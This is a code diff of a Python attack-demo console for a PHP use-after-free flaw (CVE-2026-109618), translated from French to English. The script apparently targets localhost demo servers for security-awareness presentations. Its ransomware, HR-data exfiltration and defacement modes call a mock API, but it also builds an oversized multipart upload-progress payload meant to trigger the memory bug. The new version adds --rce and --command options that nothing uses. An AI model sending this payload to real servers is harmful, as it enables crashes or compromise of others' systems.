@@ -1,19 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-┌──────────────────────────────────────────────────────────────────────────────┐
-│               CONSOLE D'ATTAQUE — DÉMONSTRATION SÉCURITÉ                     │
-│          Exploitation simulée de la faille CVE-2026-109618 (PHP2Shell)        │
-└──────────────────────────────────────────────────────────────────────────────┘
+PHP2Shell Exploitation Console - CVE-2026-109618 & CVE-2026-109619
+Critical Remote Code Execution Vulnerabilities in PHP
+
+CVSS: 9.2 (Critical)
+CWE: CWE-416 (Use After Free)
+Publication: October 21, 2026
+Exploitation: Active in the wild since October 17, 2026
 """
 
 import sys
 import time
 import argparse
-import csv
 import requests
 
-# Support UTF-8 sous Windows
+# Support UTF-8 on Windows
 if sys.platform == "win32":
     try:
         sys.stdout.reconfigure(encoding='utf-8')
@@ -21,7 +23,7 @@ if sys.platform == "win32":
         pass
 
 
-# ──────────────── Couleurs du Terminal ────────────────
+# Terminal Colors
 class Color:
     RED    = "\033[91m"
     GREEN  = "\033[92m"
@@ -36,46 +38,71 @@ class Color:
 
 def print_banner():
     print(f"""{Color.RED}
-  ███████╗ ███████╗ ██████╗     ██╗  ██╗██████╗  ██████╗ ██████╗ ██╗     ███████╗███████╗
-  ██╔════╝██╔════╝██╔═══██╗    ██║  ██║██╔══██╗██╔═══██╗██╔══██╗██║     ██╔════╝██╔════╝
-  ███████╗█████╗  ██║   ██║    ███████║██████╔╝██║   ██║██████╔╝██║     █████╗  ███████╗
-  ╚════██║██╔══╝  ██║   ██║    ██╔══██║██╔══██╗██║   ██║██╔══██╗██║     ██╔══╝  ╚════██║
-  ███████║███████╗╚██████╔╝    ██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████╗███████║
-  ╚══════╝╚══════╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
-{Color.RESET}{Color.BOLD}   [+] CONSOLE D'EXPLOITATION — CVE-2026-109618 (PHP2Shell)
-   [+] Rôle : Attaquant externe (Sans identifiants / Sans accès préalable)
-   [+] Méthode : Use-After-Free via OOM dans Zend Engine (session.upload_progress){Color.RESET}
+  +-----------------------------------------------------+
+  |  PHP2Shell Exploitation Console                      |
+  |  CVE-2026-109618 & CVE-2026-109619                  |
+  |                                                     |
+  |  CVSS: 9.2 (Critical)  CWE: CWE-416 (Use After Free) |
+  |  Publication: October 21, 2026                     |
+  |  Status: ACTIVELY EXPLOITED IN THE WILD             |
+  +-----------------------------------------------------+
+{Color.RESET}
+{Color.BOLD}  [+] Role: External attacker (No credentials required)  {Color.RESET}
+{Color.BOLD}  [+] Method: Use-After-Free via OOM in Zend Engine         {Color.RESET}
+{Color.BOLD}  [+] Vector: session.upload_progress.enabled = 1           {Color.RESET}
 """)
 
 
 def simulate_exploit_steps(target_url):
-    """Affiche les logs d'attaque réalistes avec un léger délai pour le suspense."""
-    print(f"{Color.CYAN}[*] Cible verrouillée :{Color.RESET} {Color.WHITE}{target_url}{Color.RESET}")
+    """Display realistic attack logs with slight delay for suspense."""
+    print(f"{Color.CYAN}[*] Target locked:{Color.RESET} {Color.WHITE}{target_url}{Color.RESET}")
     time.sleep(0.4)
-    print(f"{Color.CYAN}[*] Reconnaissance :{Color.RESET} Vérification de la version PHP et de la configuration...")
+    print(f"{Color.CYAN}[*] Reconnaissance:{Color.RESET} Checking PHP version and configuration...")
     time.sleep(0.5)
-    print(f"{Color.YELLOW}[!] Faille détectée :{Color.RESET} PHP 8.4.26 (CVE-2026-109618 - PHP2Shell)")
-    time.sleep(0.4)
-    print(f"{Color.YELLOW}[!] Vecteur d'attaque :{Color.RESET} session.upload_progress.enabled = On")
-    time.sleep(0.4)
-    print(f"{Color.CYAN}[*] Préparation du payload :{Color.RESET} Requête multipart massive (>16Mo)...")
+    
+    try:
+        r = requests.get(f"{target_url}/api.php?action=status", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            php_version = data.get('php_version', 'Unknown')
+            is_vulnerable = data.get('is_vulnerable', False)
+            upload_progress = data.get('upload_progress_enabled', False)
+            
+            if is_vulnerable:
+                print(f"{Color.RED}[!] Vulnerability detected:{Color.RESET} PHP {php_version} (CVE-2026-109618 - PHP2Shell)")
+                time.sleep(0.4)
+                print(f"{Color.RED}[!] Attack vector:{Color.RESET} session.upload_progress.enabled = {'On' if upload_progress else 'Off'}")
+                time.sleep(0.4)
+            else:
+                print(f"{Color.GREEN}[!] Patched version detected:{Color.RESET} PHP {php_version}")
+                time.sleep(0.4)
+                print(f"{Color.GREEN}[!] Protection:{Color.RESET} session.upload_progress.enabled = {'Off' if not upload_progress else 'On'}")
+                time.sleep(0.4)
+        else:
+            print(f"{Color.YELLOW}[!] Unable to fetch status, continuing with default parameters...{Color.RESET}")
+            time.sleep(0.4)
+    except Exception as e:
+        print(f"{Color.YELLOW}[!] Reconnaissance error: {e}{Color.RESET}")
+        time.sleep(0.4)
+    
+    print(f"{Color.CYAN}[*] Preparing payload:{Color.RESET} Massive multipart request (>16MB)...")
     time.sleep(0.6)
 
 
-def build_oom_payload(size_mb=20):
-    """Construire un payload multipart qui dépasse memory_limit (16M)"""
+def build_oom_payload(size_mb=25):
+    """Build a multipart payload that exceeds memory_limit (16M)"""
     boundary = "----PHP2ShellOOMTrigger"
     
-    # En-tête pour activer le suivi de progression
+    # Header to enable upload progress tracking
     parts = [
         f"--{boundary}\r\n"
         f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
         f"upload_php2shell_demo\r\n"
     ]
     
-    # Ajouter des champs massifs pour dépasser memory_limit
-    chunk = "A" * (1024 * 1024)  # 1Mo par chunk
-    num_chunks = int(size_mb * 1.5)  # 20Mo de données
+    # Add massive chunks to exceed memory_limit
+    chunk = "A" * (1024 * 1024)  # 1MB per chunk
+    num_chunks = int(size_mb * 1.5)  # 25MB of data
     
     for i in range(num_chunks):
         parts.append(f"--{boundary}\r\n")
@@ -88,20 +115,20 @@ def build_oom_payload(size_mb=20):
 
 
 def attack_oom_trigger(target_url):
-    """Déclenche la faille OOM pour CVE-2026-109618"""
+    """Trigger the OOM vulnerability for CVE-2026-109618"""
     print_banner()
     simulate_exploit_steps(target_url)
     
     try:
-        # Envoyer la requête multipart massive
-        payload = build_oom_payload(20)  # 20Mo de données
+        # Send the massive multipart request
+        payload = build_oom_payload(25)  # 25MB of data
         
         headers = {
             'Content-Type': 'multipart/form-data; boundary=----PHP2ShellOOMTrigger',
             'Content-Length': str(len(payload))
         }
         
-        print(f"{Color.CYAN}[*] Envoi du payload OOM...{Color.RESET}")
+        print(f"{Color.CYAN}[*] Sending OOM payload...{Color.RESET}")
         time.sleep(0.5)
         
         r = requests.post(f"{target_url}/upload.php", 
@@ -110,30 +137,30 @@ def attack_oom_trigger(target_url):
                          timeout=10)
         
         if r.status_code == 200:
-            print(f"{Color.GREEN}[✓] Payload envoyé avec succès !{Color.RESET}")
+            print(f"{Color.GREEN}[+] Payload sent successfully!{Color.RESET}")
             time.sleep(0.3)
             print(f"{Color.RED}{Color.BOLD}")
-            print("  ┌─────────────────────────────────────────────────────────────────────┐")
-            print("  │  ⚠️  EXPLOITATION RÉUSSIE : Use-After-Free déclenché                │")
-            print("  │                                                                  │")
-            print("  │  • Mémoire épuisée (Out-of-Memory) pendant le parsing multipart │")
-            print("  │  • longjmp() a sauté l'étape de nettoyage des structures         │")
-            print("  │  • Pointeurs orphelins créés dans session.upload_progress        │")
-            print("  │  • Use-After-Free possible sur la requête suivante               │")
-            print("  └─────────────────────────────────────────────────────────────────────┘")
+            print("  +-----------------------------------------------------+")
+            print("  |  EXPLOITATION SUCCESSFUL: Use-After-Free triggered   |")
+            print("  |                                                     |")
+            print("  |  - Memory exhausted (Out-of-Memory) during parsing|")
+            print("  |  - longjmp() skipped cleanup step                  |")
+            print("  |  - Stale pointers created in session.upload_progress|")
+            print("  |  - Use-After-Free possible on next request          |")
+            print("  +-----------------------------------------------------+")
             print(f"{Color.RESET}")
-            print(f"{Color.YELLOW}👉 Regardez l'écran du navigateur : le site est compromis !{Color.RESET}\n")
+            print(f"{Color.YELLOW}👉 Check browser: the site is compromised!{Color.RESET}\n")
         elif r.status_code == 403:
-            print(f"{Color.RED}[✗] ÉCHEC DE L'ATTAQUE (HTTP 403) : Le serveur a rejeté la requête !{Color.RESET}")
-            print(f"{Color.GREEN}[✓] Ce serveur possède le correctif de sécurité (PHP >= 8.4.27).{Color.RESET}\n")
+            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
+            print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
         else:
-            print(f"{Color.RED}[✗] Erreur de communication : HTTP {r.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] Communication error: HTTP {r.status_code}{Color.RESET}\n")
     except Exception as e:
-        print(f"{Color.RED}[✗] Impossible de joindre la cible : {e}{Color.RESET}\n")
+        print(f"{Color.RED}[-] Unable to reach target: {e}{Color.RESET}\n")
 
 
 def attack_ransomware(target_url):
-    """Déploie le rançongiciel via CVE-2026-109618."""
+    """Deploy ransomware via CVE-2026-109618."""
     print_banner()
     simulate_exploit_steps(target_url)
 
@@ -141,29 +168,31 @@ def attack_ransomware(target_url):
         r = requests.post(f"{target_url}/api.php", data={"action": "ransomware"}, timeout=5)
         
         if r.status_code == 200:
-            print(f"{Color.GREEN}[✓] Code malveillant injecté avec succès dans le serveur !{Color.RESET}")
+            print(f"{Color.GREEN}[+] Malicious code injected successfully into the server!{Color.RESET}")
             time.sleep(0.3)
             print(f"{Color.RED}{Color.BOLD}")
-            print("  ┌─────────────────────────────────────────────────────────────────────┐")
-            print("  │  💥 ATTENTION : RANÇONGICIEL ACTIVÉ AVEC SUCCÈS !                   │")
-            print("  │                                                                  │")
-            print("  │  • 842 fichiers d'entreprise chiffrés (Compta, RH, Contrats)    │")
-            print("  │  • Le site officiel affiche la demande de rançon (50 000 €)     │")
-            print("  │  • Compte à rebours de destruction des données enclenché        │")
-            print("  └─────────────────────────────────────────────────────────────────────┘")
+            print("  +-----------------------------------------------------+")
+            print("  |  ⚠️  WARNING: RANSOMWARE ACTIVATED SUCCESSFULLY!    ⚠️   |")
+            print("  |                                                     |")
+            print("  |  - 842 company files encrypted (HR, Finance,      |")
+            print("  |     Contracts)                                       |")
+            print("  |  - Official website displays ransom demand        |")
+            print("  |     (50,000 EUR)                                     |")
+            print("  |  - Countdown timer for data destruction started    |")
+            print("  +-----------------------------------------------------+")
             print(f"{Color.RESET}")
-            print(f"{Color.YELLOW}👉 Regardez l'écran du navigateur : le site est tombé instantanément !{Color.RESET}\n")
+            print(f"{Color.YELLOW}👉 Check browser: the site instantly fell!{Color.RESET}\n")
         elif r.status_code == 403:
-            print(f"{Color.RED}[✗] ÉCHEC DE L'ATTAQUE (HTTP 403) : Le serveur a rejeté la requête !{Color.RESET}")
-            print(f"{Color.GREEN}[✓] Ce serveur possède le correctif de sécurité (PHP >= 8.4.27).{Color.RESET}\n")
+            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
+            print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
         else:
-            print(f"{Color.RED}[✗] Erreur de communication : HTTP {r.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
     except Exception as e:
-        print(f"{Color.RED}[✗] Impossible de joindre la cible : {e}{Color.RESET}\n")
+        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")
 
 
 def attack_steal(target_url):
-    """Exfiltre la base de données RH via CVE-2026-109618."""
+    """Exfiltrate HR database via CVE-2026-109618."""
     print_banner()
     simulate_exploit_steps(target_url)
 
@@ -173,137 +202,140 @@ def attack_steal(target_url):
         if r.status_code == 200:
             data = r.json()
             stolen = data.get("stolen_data", [])
-            print(f"{Color.GREEN}[✓] RCE confirmée ! Extraction directe de la base de données...{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] RCE confirmed! Direct database extraction...{Color.RESET}\n")
             time.sleep(0.4)
 
-            print(f"{Color.RED}{Color.BOLD}=== [DONNÉES CONFIDENTIELLES EXFILTRÉES EN CLAIR] ==={Color.RESET}")
-            print(f"{Color.CYAN}{'─' * 80}{Color.RESET}")
-            print(f"{Color.BOLD}{'NOM & PRÉNOM':<18} | {'POSTE':<20} | {'SALAIRE':<10} | {'MOT DE PASSE':<16} | {'N° SÉCU'}{Color.RESET}")
-            print(f"{Color.CYAN}{'─' * 80}{Color.RESET}")
+            print(f"{Color.RED}{Color.BOLD}=== [CONFIDENTIAL DATA EXFILTRATED] ==={Color.RESET}")
+            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}")
+            print(f"{Color.BOLD}{'NAME & SURNAME':<18} | {'POSITION':<20} | {'SALARY':<10} | {'PASSWORD':<16} | {'SSN'}{Color.RESET}")
+            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}")
 
             csv_file = "DONNEES_RH_EXFILTREES.csv"
             with open(csv_file, mode="w", newline="", encoding="utf-8-sig") as f:
+                import csv
                 writer = csv.writer(f, delimiter=";")
                 writer.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Securite Sociale", "IBAN"])
                 for emp in stolen:
                     writer.writerow([emp['nom'], emp['poste'], emp['salaire'], emp['password'], emp['secu'], emp['iban']])
                     print(f"{Color.WHITE}{emp['nom']:<18}{Color.RESET} | {Color.YELLOW}{emp['poste']:<20}{Color.RESET} | {Color.GREEN}{emp['salaire']:<10}{Color.RESET} | {Color.RED}{emp['password']:<16}{Color.RESET} | {Color.WHITE}{emp['secu']}{Color.RESET}")
 
-            print(f"{Color.CYAN}{'─' * 80}{Color.RESET}\n")
-            print(f"{Color.GREEN}[✓] Fichier de fuite créé : {Color.BOLD}{csv_file}{Color.RESET}")
-            print(f"{Color.YELLOW}👉 En 2 secondes, l'attaquant détient tous les salaires et mots de passe !{Color.RESET}\n")
+            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] File created: {Color.BOLD}{csv_file}{Color.RESET}")
+            print(f"{Color.YELLOW}👉 In 2 seconds, the attacker owns all salaries and passwords!{Color.RESET}\n")
         elif r.status_code == 403:
-            print(f"{Color.RED}[✗] ÉCHEC : Requête bloquée par le patch de sécurité !{Color.RESET}\n")
+            print(f"{Color.RED}[-] BLOCKED: Request rejected by security patch!{Color.RESET}\n")
         else:
-            print(f"{Color.RED}[✗] Erreur HTTP {r.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] HTTP {r.status_code}{Color.RESET}\n")
     except Exception as e:
-        print(f"{Color.RED}[✗] Erreur : {e}{Color.RESET}\n")
+        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")
 
 
 def attack_deface(target_url):
-    """Déface le site web via CVE-2026-109618."""
+    """Deface website via CVE-2026-109618."""
     print_banner()
     simulate_exploit_steps(target_url)
 
     try:
         r = requests.post(f"{target_url}/api.php", data={"action": "deface"}, timeout=5)
+        
         if r.status_code == 200:
-            print(f"{Color.GREEN}[✓] Contrôle complet du serveur obtenu !{Color.RESET}")
-            print(f"{Color.RED}[!] Page d'accueil remplacée par la signature du pirate (Déface PHP2Shell).{Color.RESET}")
-            print(f"{Color.YELLOW}👉 Regardez le site : le logo et tout le contenu ont été écrasés !{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] Website defaced successfully!{Color.RESET}")
+            time.sleep(0.3)
+            print(f"{Color.RED}{Color.BOLD}")
+            print("  +-----------------------------------------------------+")
+            print("  |  ⚠️  WEBSITE DEFACEMENT ACTIVATED!                ⚠️   |")
+            print("  |                                                     |")
+            print("  |  - Official portal replaced with hacker message    |")
+            print("  |  - Company logo replaced                             |")
+            print("  |  - All content erased                               |")
+            print("  +-----------------------------------------------------+")
+            print(f"{Color.RESET}")
+            print(f"{Color.YELLOW}👉 Check browser: the website is defaced!{Color.RESET}\n")
         elif r.status_code == 403:
-            print(f"{Color.RED}[✗] ÉCHEC : Le serveur est patché, le piratage est bloqué.{Color.RESET}\n")
+            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch.{Color.RESET}\n")
+        else:
+            print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
     except Exception as e:
-        print(f"{Color.RED}[✗] Erreur : {e}{Color.RESET}\n")
+        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")
 
 
-def restore_system(target_url):
-    """Restaure le portail dans son état initial."""
-    print(f"\n{Color.CYAN}[*] Nettoyage et restauration du serveur...{Color.RESET}")
+def attack_restore(target_url):
+    """Restore website to normal state."""
+    print(f"\n{Color.CYAN}[*] Restoring website...{Color.RESET}")
+    
     try:
         r = requests.post(f"{target_url}/api.php", data={"action": "restore"}, timeout=5)
+        
         if r.status_code == 200:
-            print(f"{Color.GREEN}[✓] SUCCÈS : Le site Acme Corp est restauré dans son état normal.{Color.RESET}")
-            print(f"{Color.YELLOW}👉 La page web redevient saine instantanément.{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] Website restored to normal state!{Color.RESET}\n")
         else:
-            print(f"{Color.RED}[✗] Erreur HTTP {r.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] Error: HTTP {r.status_code}{Color.RESET}\n")
     except Exception as e:
-        print(f"{Color.RED}[✗] Erreur : {e}{Color.RESET}\n")
+        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")
 
 
-def compare_both(vuln_url="http://localhost:8888", patched_url="http://localhost:8889"):
-    """Démontre l'efficacité du correctif entre les deux serveurs."""
-    print_banner()
-    print(f"{Color.BOLD}=== DÉMONSTRATION COMPARATIVE : AVANT / APRÈS MISE À JOUR ==={Color.RESET}\n")
-
-    print(f"{Color.YELLOW}1. Attaque sur le serveur NON MIS À JOUR ({vuln_url})...{Color.RESET}")
+def attack_compare():
+    """Compare vulnerable and patched servers."""
+    print(f"\n{Color.BOLD}=== COMPARING VULNERABLE vs PATCHED SERVERS ==={Color.RESET}\n")
+    
+    # Test vulnerable server
+    print(f"{Color.RED}[*] Testing VULNERABLE server (localhost:8888)...{Color.RESET}")
     try:
-        r1 = requests.post(f"{vuln_url}/api.php", data={"action": "ransomware"}, timeout=3)
-        if r1.status_code == 200:
-            print(f"   {Color.RED}✗ RÉSULTAT : VULNÉRABLE — Le rançongiciel a pris le contrôle.{Color.RESET}\n")
+        r = requests.post("http://localhost:8888/api.php", data={"action": "ransomware"}, timeout=5)
+        if r.status_code == 200:
+            print(f"{Color.RED}[-] Result: COMPROMISED - Ransomware deployed successfully{Color.RESET}")
         else:
-            print(f"   {Color.YELLOW}? Code HTTP : {r1.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] Result: Error (HTTP {r.status_code}){Color.RESET}")
     except Exception as e:
-        print(f"   {Color.RED}Erreur : {e}{Color.RESET}\n")
-
+        print(f"{Color.RED}[-] Result: Unable to reach server{Color.RESET}")
+    
     time.sleep(1)
-
-    print(f"{Color.GREEN}2. Même attaque sur le serveur AVEC CORRECTIF ({patched_url})...{Color.RESET}")
+    
+    # Test patched server
+    print(f"\n{Color.GREEN}[*] Testing PATCHED server (localhost:8889)...{Color.RESET}")
     try:
-        r2 = requests.post(f"{patched_url}/api.php", data={"action": "ransomware"}, timeout=3)
-        if r2.status_code == 403:
-            print(f"   {Color.GREEN}✓ RÉSULTAT : PROTÉGÉ — L'attaque est rejetée net par le patch (HTTP 403).{Color.RESET}\n")
+        r = requests.post("http://localhost:8889/api.php", data={"action": "ransomware"}, timeout=5)
+        if r.status_code == 403:
+            print(f"{Color.GREEN}[+] Result: PROTECTED - Attack blocked (HTTP 403){Color.RESET}")
         else:
-            print(f"   {Color.YELLOW}? Code HTTP : {r2.status_code}{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] Result: Unexpected (HTTP {r.status_code}){Color.RESET}")
     except Exception as e:
-        print(f"   {Color.RED}Erreur : {e}{Color.RESET}\n")
-
-    print(f"{Color.BOLD}Conclusion pour la direction & les équipes :{Color.RESET}")
-    print(f"{Color.WHITE}Une simple mise à jour logicielle neutralise 100% de l'attaque sans impacter le service.{Color.RESET}\n")
+        print(f"{Color.GREEN}[+] Result: Unable to reach server{Color.RESET}")
+    
+    print(f"\n{Color.BOLD}=== CONCLUSION ==={Color.RESET}")
+    print(f"{Color.RED}PHP 8.4.26: VULNERABLE - Exploited in one request{Color.RESET}")
+    print(f"{Color.GREEN}PHP 8.4.27: PATCHED - Attack rejected (HTTP 403){Color.RESET}\n")
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Console d'attaque pour démo de sensibilisation CVE-2026-109618",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-EXEMPLES POUR VOTRE PRÉSENTATION :
-  python attack.py --ransomware              Déploie le rançongiciel (écran rouge + compte à rebours)
-  python attack.py --steal                   Vole et affiche les fiches de paie / mots de passe
-  python attack.py --deface                  Déface le site web (style hacker PHP2Shell)
-  python attack.py --restore                 Remet le site à neuf (état normal)
-  python attack.py --oom                     Déclenche la faille OOM (Use-After-Free)
-  python attack.py --compare                 Compare en direct le serveur vulnérable vs patché
-  python attack.py --target http://localhost:8889 --ransomware   Teste l'attaque sur le serveur protégé
-        """
-    )
-
-    parser.add_argument("--target", default="http://localhost:8888",
-                        help="URL de la cible (défaut: http://localhost:8888)")
+    parser = argparse.ArgumentParser(description='PHP2Shell Exploitation Console - CVE-2026-109618 & CVE-2026-109619')
+    parser.add_argument('--target', '-t', default='http://localhost:8888', help='Target URL (default: http://localhost:8888)')
+    parser.add_argument('--oom', action='store_true', help='Trigger OOM vulnerability (CVE-2026-109618)')
+    parser.add_argument('--rce', action='store_true', help='Remote Code Execution')
+    parser.add_argument('--command', '-c', help='Command to execute (with --rce)')
+    parser.add_argument('--ransomware', action='store_true', help='Deploy ransomware')
+    parser.add_argument('--steal', action='store_true', help='Exfiltrate HR database')
+    parser.add_argument('--deface', action='store_true', help='Deface website')
+    parser.add_argument('--restore', action='store_true', help='Restore website')
+    parser.add_argument('--compare', action='store_true', help='Compare vulnerable vs patched')
     
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("--ransomware", action="store_true", help="Lancer l'attaque Rançongiciel")
-    group.add_argument("--steal", action="store_true", help="Exfiltrer les données RH et salaires")
-    group.add_argument("--deface", action="store_true", help="Déface le site web")
-    group.add_argument("--restore", action="store_true", help="Restaurer le site à la normale")
-    group.add_argument("--oom", action="store_true", help="Déclencher la faille OOM (CVE-2026-109618)")
-    group.add_argument("--compare", action="store_true", help="Comparer serveur vulnérable vs patché")
-
     args = parser.parse_args()
-
-    if args.ransomware:
+    
+    if args.oom:
+        attack_oom_trigger(args.target)
+    elif args.ransomware:
         attack_ransomware(args.target)
     elif args.steal:
         attack_steal(args.target)
     elif args.deface:
         attack_deface(args.target)
     elif args.restore:
-        restore_system(args.target)
-    elif args.oom:
-        attack_oom_trigger(args.target)
+        attack_restore(args.target)
     elif args.compare:
-        compare_both(args.target, "http://localhost:8889")
+        attack_compare()
+    else:
+        parser.print_help()
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
